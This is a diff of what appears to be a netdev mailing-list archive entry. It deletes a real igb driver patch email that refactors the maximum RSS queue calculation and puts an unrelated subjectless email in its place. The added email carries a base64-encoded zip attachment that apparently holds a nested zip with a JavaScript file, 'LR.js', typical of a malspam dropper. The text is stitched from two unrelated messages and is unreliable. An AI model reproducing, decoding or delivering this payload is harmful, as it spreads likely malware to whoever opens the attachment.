@@ -1,113 +1,66 @@
-From: Zhang Shengju <zhangshengju@cmss.chinamobile.com>
-Subject: [net-next] igb: add function to get maximum RSS queues
-Date: Fri, 28 Jul 2017 15:03:26 +0800
-Message-ID: <1501225406-43554-1-git-send-email-zhangshengju@cmss.chinamobile.com>
-To: jeffrey.t.kirsher@intel.com, netdev@vger.kernel.org
+From: <doctornina@abv.bg>
+Subject: (unknown)
+Date: Fri, 28 Jul 2017 07:17:19 -0000
+Message-ID: <150122623995.2158.14833554179499965285@hinet.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EMAIL_47501615459_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from cmccmta1.chinamobile.com ([221.176.66.79]:15971 "EHLO
-        cmccmta1.chinamobile.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751958AbdG1HNE (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Fri, 28 Jul 2017 03:13:04 -0400
+Received: from 114-24-153-220.dynamic-ip.hinet.net ([114.24.153.220]:40660
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751071AbdG1HR1 (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Fri, 28 Jul 2017 03:17:27 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-This patch adds a new function igb_get_max_rss_queues() to get maximum
-RSS queues, this will reduce duplicate code and facilitate future
-maintenance.
-
-Signed-off-by: Zhang Shengju <zhangshengju@cmss.chinamobile.com>
----
- drivers/net/ethernet/intel/igb/igb.h         |  1 +
- drivers/net/ethernet/intel/igb/igb_ethtool.c | 32 +---------------------------
- drivers/net/ethernet/intel/igb/igb_main.c    | 12 +++++++++--
- 3 files changed, 12 insertions(+), 33 deletions(-)
-
-diff --git a/drivers/net/ethernet/intel/igb/igb.h b/drivers/net/ethernet/intel/igb/igb.h
-index 06ffb2b..ca94eff 100644
---- a/drivers/net/ethernet/intel/igb/igb.h
-+++ b/drivers/net/ethernet/intel/igb/igb.h
-@@ -684,6 +684,7 @@ void igb_ptp_rx_pktstamp(struct igb_q_vector *q_vector, void *va,
- int igb_ptp_set_ts_config(struct net_device *netdev, struct ifreq *ifr);
- int igb_ptp_get_ts_config(struct net_device *netdev, struct ifreq *ifr);
- void igb_set_flag_queue_pairs(struct igb_adapter *, const u32);
-+unsigned int igb_get_max_rss_queues(struct igb_adapter *);
- #ifdef CONFIG_IGB_HWMON
- void igb_sysfs_exit(struct igb_adapter *adapter);
- int igb_sysfs_init(struct igb_adapter *adapter);
-diff --git a/drivers/net/ethernet/intel/igb/igb_ethtool.c b/drivers/net/ethernet/intel/igb/igb_ethtool.c
-index d06a8db..606e676 100644
---- a/drivers/net/ethernet/intel/igb/igb_ethtool.c
-+++ b/drivers/net/ethernet/intel/igb/igb_ethtool.c
-@@ -3338,37 +3338,7 @@ static int igb_set_rxfh(struct net_device *netdev, const u32 *indir,
- 
- static unsigned int igb_max_channels(struct igb_adapter *adapter)
- {
--	struct e1000_hw *hw = &adapter->hw;
--	unsigned int max_combined = 0;
--
--	switch (hw->mac.type) {
--	case e1000_i211:
--		max_combined = IGB_MAX_RX_QUEUES_I211;
--		break;
--	case e1000_82575:
--	case e1000_i210:
--		max_combined = IGB_MAX_RX_QUEUES_82575;
--		break;
--	case e1000_i350:
--		if (!!adapter->vfs_allocated_count) {
--			max_combined = 1;
--			break;
--		}
--		/* fall through */
--	case e1000_82576:
--		if (!!adapter->vfs_allocated_count) {
--			max_combined = 2;
--			break;
--		}
--		/* fall through */
--	case e1000_82580:
--	case e1000_i354:
--	default:
--		max_combined = IGB_MAX_RX_QUEUES;
--		break;
--	}
--
--	return max_combined;
-+	return igb_get_max_rss_queues(adapter);
- }
- 
- static void igb_get_channels(struct net_device *netdev,
-diff --git a/drivers/net/ethernet/intel/igb/igb_main.c b/drivers/net/ethernet/intel/igb/igb_main.c
-index ec62410..e6cc6b5 100644
---- a/drivers/net/ethernet/intel/igb/igb_main.c
-+++ b/drivers/net/ethernet/intel/igb/igb_main.c
-@@ -3026,10 +3026,10 @@ static void igb_probe_vfs(struct igb_adapter *adapter)
- #endif /* CONFIG_PCI_IOV */
- }
- 
--static void igb_init_queue_configuration(struct igb_adapter *adapter)
-+unsigned int igb_get_max_rss_queues(struct igb_adapter *adapter)
- {
- 	struct e1000_hw *hw = &adapter->hw;
--	u32 max_rss_queues;
-+	unsigned int max_rss_queues;
- 
- 	/* Determine the maximum number of RSS queues supported. */
- 	switch (hw->mac.type) {
-@@ -3060,6 +3060,14 @@ static void igb_init_queue_configuration(struct igb_adapter *adapter)
- 		break;
- 	}
- 
-+	return max_rss_queues;
-+}
-+
-+static void igb_init_queue_configuration(struct igb_adapter *adapter)
-+{
-+	u32 max_rss_queues;
-+
-+	max_rss_queues = igb_get_max_rss_queues(adapter);
- 	adapter->rss_queues = min_t(u32, max_rss_queues, num_online_cpus());
- 
- 	igb_set_flag_queue_pairs(adapter, max_rss_queues);
--- 
-1.8.3.1
+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
